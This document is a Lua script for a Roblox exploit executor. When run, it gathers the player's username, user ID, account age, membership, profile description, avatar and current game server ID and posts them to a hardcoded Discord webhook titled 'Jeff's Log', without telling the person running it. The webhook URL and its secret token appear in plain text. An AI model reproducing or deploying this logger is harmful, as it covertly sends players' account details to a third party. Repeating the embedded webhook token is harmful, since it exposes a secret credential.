getgenv().Notify = true
local Notify_Webhook = "https://discord.com/api/webhooks/1410235814868422748/HHslrd5nhy8Oy6eD-5YXaYQUJVf45hLj48HmJH1WJY9zmjbcYyTA-qUUCu3bS-A8iBVB"

if not getcustomasset then
	game:Shutdown() -- Fucked out
end

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService('HttpService')

function notify_hook()
	-- Thumb API
	local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true")
	local json = HttpService:JSONDecode(ThumbnailAPI)
	local avatardata = json.data[1].imageUrl

	-------- User API Script
	local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/"..player.UserId)
	local json = HttpService:JSONDecode(UserAPI)
	-------- Description Data
	local DescriptionData = json.description
	-------- Created Data
	local CreatedData = json.created

	local send_data = {
		["username"] = "Jumpscare Notify",
		["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
		["content"] = "Jeff Wuz Here !",
		["embeds"] = {
			{
				["title"] = "Jeff's Log",
				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
				["color"] = 4915083,
				["fields"] = {
					{
						["name"] = "Username",
						["value"] = player.Name,
						["inline"] = true
					},
					{
						["name"] = "Display Name",
						["value"] = player.DisplayName,
						["inline"] = true
					},
					{
						["name"] = "User ID",
						["value"] = player.UserId,
						["inline"] = true
					},
					{
						["name"] = "Account Age",
						["value"] = player.AccountAge.." Day",
						["inline"] = true
					},
					{
						["name"] = "Membership",
						["value"] = player.MembershipType.Name,
						["inline"] = true
					},
					{
						["name"] = "Account Created Day",
						["value"] = string.match(CreatedData, "^([%d-]+)"),
						["inline"] = true
					},
					{
						["name"] = "Profile Description",
						["value"] = "```\n"..DescriptionData.."\n```",
						["inline"] = true
					}
				},
				["footer"] = {
					["text"] = "JTK Log",
					["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
				},
				["thumbnail"] = {
					["url"] = avatardata
				}
			}
		},
	}

	local headers = {
		["Content-Type"] = "application/json"
	}

	request({
		Url = Notify_Webhook,
		Method = "POST",
		Headers = headers,
		Body = game:GetService("HttpService"):JSONEncode(send_data)
	})
end

if getgenv().Notify == true then
	if Notify_Webhook == '' then
		return;
	else
		notify_hook()
	end
elseif getgenv().Notify == false then
	return;
else
	warn("True or False")
end